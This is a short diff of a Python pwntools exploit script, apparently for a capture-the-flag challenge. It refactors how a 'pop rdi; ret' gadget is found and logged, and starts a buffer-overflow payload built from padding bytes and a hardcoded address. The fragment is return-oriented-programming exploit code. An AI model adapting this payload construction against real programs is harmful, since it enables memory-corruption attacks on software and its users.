@@ -26,9 +26,8 @@ info("%#x ROP", u64(rop.chain()))
 
 execute_string = p64(0x402107)
 info("%#x Execute String Address", u64(execute_string))
-POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
-info("%#x POP RDI", POP_RDI)
 POP_RDI = p64((rop.find_gadget(['pop rdi', 'ret']))[0])
+info("%#x POP RDI", u64(POP_RDI))
 
 payload = [
     b"A" * padding_length,
